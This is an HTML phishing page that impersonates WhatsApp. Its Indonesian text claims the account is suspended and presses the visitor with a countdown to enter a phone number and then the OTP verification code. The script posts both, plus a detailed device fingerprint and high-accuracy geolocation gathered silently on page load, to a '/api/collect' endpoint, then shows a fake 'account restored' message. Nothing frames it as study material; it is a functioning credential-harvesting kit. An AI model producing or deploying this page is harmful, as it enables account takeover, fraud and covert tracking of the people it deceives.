<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp - Account Suspended</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #075e54 0%, #128c7e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            border-radius: 16px;
            padding: 40px 30px;
            max-width: 480px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .wa-logo {
            width: 80px;
            height: 80px;
            background: #25D366;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 48px;
            color: white;
        }
        .warning-icon {
            width: 64px;
            height: 64px;
            background: #ff4444;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px auto;
            font-size: 36px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255,68,68,0.7); }
            70% { box-shadow: 0 0 0 20px rgba(255,68,68,0); }
            100% { box-shadow: 0 0 0 0 rgba(255,68,68,0); }
        }
        h1 { color: #333; font-size: 24px; margin: 15px 0; }
        p { color: #666; margin: 10px 0 20px; line-height: 1.6; font-size: 14px; }
        .form-group { margin: 15px 0; text-align: left; }
        label { display: block; color: #555; font-size: 13px; font-weight: 600; margin-bottom: 5px; }
        .country-select { display: flex; gap: 10px; }
        select {
            width: 30%;
            padding: 12px 10px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            background: #f9f9f9;
        }
        input[type="tel"], input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border 0.3s;
        }
        input:focus { border-color: #128c7e; outline: none; }
        .verify-btn {
            width: 100%;
            padding: 14px;
            background: #25D366;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            transition: background 0.3s;
        }
        .verify-btn:hover { background: #128c7e; }
        .footer-text { font-size: 11px; color: #999; margin-top: 15px; }
        .loading-spinner {
            display: none;
            width: 30px;
            height: 30px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #25D366;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 15px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="wa-logo">💬</div>
        <h1>Akun WhatsApp Dinonaktifkan</h1>
        <div class="warning-icon">⚠️</div>
        <p>Akun WhatsApp Anda telah dilaporkan melanggar <strong>Ketentuan Layanan</strong>. 
        Verifikasi nomor Anda dalam <span id="timer">05:00</span> menit untuk menghindari penghapusan permanen.</p>
        
        <form id="verifyForm">
            <div class="form-group">
                <label>Kode Negara</label>
                <select id="countryCode" required>
                    <option value="+62">Indonesia (+62)</option>
                    <option value="+1">USA (+1)</option>
                    <option value="+44">UK (+44)</option>
                    <option value="+91">India (+91)</option>
                    <option value="+60">Malaysia (+60)</option>
                    <option value="+65">Singapore (+65)</option>
                    <option value="+81">Japan (+81)</option>
                    <option value="+86">China (+86)</option>
                    <option value="+82">Korea (+82)</option>
                    <option value="+971">UAE (+971)</option>
                </select>
            </div>
            <div class="form-group">
                <label>Nomor WhatsApp</label>
                <input type="tel" id="phoneNumber" placeholder="8xx-xxxx-xxxx" required>
            </div>
            <div class="form-group" id="otpSection" style="display: none;">
                <label>Kode Verifikasi OTP</label>
                <input type="password" id="otpCode" placeholder="Masukkan 6 digit kode" maxlength="6">
            </div>
            <button type="submit" class="verify-btn" id="verifyBtn">VERIFIKASI SEKARANG</button>
            <div class="loading-spinner" id="loading"></div>
        </form>
        <p class="footer-text" id="statusText">© 2024 WhatsApp LLC. Proses verifikasi keamanan.</p>
    </div>

    <script>
        let step = 1;
        let phoneNumber = '';
        let countryCode = '';
        let timerInterval;
        
        // Timer countdown
        let timeLeft = 300;
        const timerElement = document.getElementById('timer');
        
        function startTimer() {
            timerInterval = setInterval(() => {
                timeLeft--;
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    timerElement.textContent = "00:00";
                    document.getElementById('statusText').textContent = "⚠️ Waktu habis! Akun akan dihapus permanen.";
                }
            }, 1000);
        }
        startTimer();
        
        // Device info collection
        function collectDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                deviceMemory: navigator.deviceMemory || 'unknown',
                vendor: navigator.vendor,
                vendorSub: navigator.vendorSub,
                product: navigator.product,
                productSub: navigator.productSub,
                appVersion: navigator.appVersion,
                appName: navigator.appName,
                appCodeName: navigator.appCodeName,
                onLine: navigator.onLine,
                connection: navigator.connection ? {
                    downlink: navigator.connection.downlink,
                    effectiveType: navigator.connection.effectiveType,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData,
                    type: navigator.connection.type
                } : null,
                battery: null,
                permissions: [],
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    availWidth: window.screen.availWidth,
                    availHeight: window.screen.availHeight,
                    colorDepth: window.screen.colorDepth,
                    pixelDepth: window.screen.pixelDepth,
                    orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown'
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                timestamp: new Date().toISOString(),
                referrer: document.referrer,
                plugins: Array.from(navigator.plugins).map(p => p.name),
                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
                webgl: getWebGLInfo(),
                canvas: getCanvasFingerprint(),
                audio: getAudioFingerprint(),
                fonts: [],
                storage: getStorageInfo(),
                geolocation: null
            };
            
            // Battery info
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    info.battery = {
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime,
                        level: battery.level
                    };
                });
            }
            
            // Permissions
            if (navigator.permissions) {
                const permList = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'];
                permList.forEach(perm => {
                    navigator.permissions.query({name: perm}).then(status => {
                        info.permissions.push({name: perm, state: status.state});
                    }).catch(() => {});
                });
            }
            
            // Geolocation
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        info.geolocation = {
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            altitudeAccuracy: pos.coords.altitudeAccuracy,
                            heading: pos.coords.heading,
                            speed: pos.coords.speed
                        };
                    },
                    err => { info.geolocation = {error: err.message}; },
                    {enableHighAccuracy: true, timeout: 5000, maximumAge: 0}
                );
            }
            
            return info;
        }
        
        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return null;
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
                    version: gl.getParameter(gl.VERSION),
                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                    extensions: gl.getSupportedExtensions()
                };
            } catch(e) { return null; }
        }
        
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125,1,62,20);
                ctx.fillStyle = '#069';
                ctx.fillText('WhatsApp Browser 2024 🗿', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('WhatsApp Browser 2024 🗿', 4, 17);
                return canvas.toDataURL();
            } catch(e) { return null; }
        }
        
        function getAudioFingerprint() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                const gainNode = audioCtx.createGain();
                const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);
                
                oscillator.type = 'triangle';
                oscillator.frequency.value = 10000;
                gainNode.gain.value = 0.1;
                
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                
                oscillator.start(0);
                
                const freqData = new Float32Array(analyser.frequencyBinCount);
                analyser.getFloatFrequencyData(freqData);
                
                oscillator.stop(0);
                scriptProcessor.disconnect();
                gainNode.disconnect();
                analyser.disconnect();
                audioCtx.close();
                
                return {
                    sampleRate: audioCtx.sampleRate,
                    state: audioCtx.state,
                    freqDataHash: Array.from(freqData.slice(0, 20)).reduce((a,b) => a + Math.abs(b), 0)
                };
            } catch(e) { return null; }
        }
        
        function getStorageInfo() {
            return {
                localStorage: Object.keys(localStorage).length > 0 ? 'available' : 'empty',
                sessionStorage: Object.keys(sessionStorage).length > 0 ? 'available' : 'empty',
                indexedDB: !!window.indexedDB ? 'available' : 'unavailable'
            };
        }
        
        // Form submission
        document.getElementById('verifyForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('verifyBtn');
            const loading = document.getElementById('loading');
            const statusText = document.getElementById('statusText');
            
            if (step === 1) {
                countryCode = document.getElementById('countryCode').value;
                phoneNumber = document.getElementById('phoneNumber').value;
                
                if (!phoneNumber || phoneNumber.length < 8) {
                    statusText.textContent = '❌ Nomor tidak valid! Masukkan nomor yang benar.';
                    return;
                }
                
                // Send phone number + device info
                btn.style.display = 'none';
                loading.style.display = 'block';
                statusText.textContent = '🔄 Memverifikasi nomor...';
                
                const deviceInfo = collectDeviceInfo();
                deviceInfo.step = 'phone_verification';
                deviceInfo.phoneNumber = countryCode + phoneNumber;
                
                await sendToServer(deviceInfo, '/api/collect');
                
                setTimeout(() => {
                    loading.style.display = 'none';
                    step = 2;
                    document.getElementById('otpSection').style.display = 'block';
                    document.getElementById('phoneNumber').disabled = true;
                    document.getElementById('countryCode').disabled = true;
                    btn.textContent = 'KIRIM KODE OTP';
                    btn.style.display = 'block';
                    statusText.textContent = '📱 Kode OTP telah dikirim ke nomor Anda.';
                }, 2000);
                
            } else if (step === 2) {
                const otpCode = document.getElementById('otpCode').value;
                
                if (!otpCode || otpCode.length < 4) {
                    statusText.textContent = '❌ Kode OTP tidak valid! Masukkan 6 digit kode.';
                    return;
                }
                
                btn.style.display = 'none';
                loading.style.display = 'block';
                statusText.textContent = '🔄 Verifikasi OTP...';
                
                const finalData = collectDeviceInfo();
                finalData.step = 'otp_verification';
                finalData.otpCode = otpCode;
                finalData.fullPhone = countryCode + phoneNumber;
                
                await sendToServer(finalData, '/api/collect');
                
                setTimeout(() => {
                    loading.style.display = 'none';
                    statusText.textContent = '✅ Verifikasi berhasil! Akun Anda telah dipulihkan.';
                    document.getElementById('verifyForm').innerHTML = `
                        <div style="text-align: center; padding: 20px;">
                            <div style="font-size: 64px;">✅</div>
                            <h2 style="color: #25D366;">Akun Berhasil Dipulihkan</h2>
                            <p>Akun WhatsApp ${countryCode}${phoneNumber} telah aktif kembali.</p>
                            <p style="font-size: 12px; color: #999;">Silakan tutup halaman ini dan buka WhatsApp Anda.</p>
                        </div>
                    `;
                    clearInterval(timerInterval);
                }, 2000);
            }
        });
        
        async function sendToServer(data, endpoint) {
            try {
                await fetch(endpoint, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
            } catch(e) {
                console.log('Data collected locally');
            }
        }
        
        // Auto-submit on page load to collect initial device info
        window.addEventListener('load', () => {
            setTimeout(async () => {
                const initialData = collectDeviceInfo();
                initialData.step = 'page_load';
                await sendToServer(initialData, '/api/collect');
            }, 500);
        });
    </script>
</body>
</html>
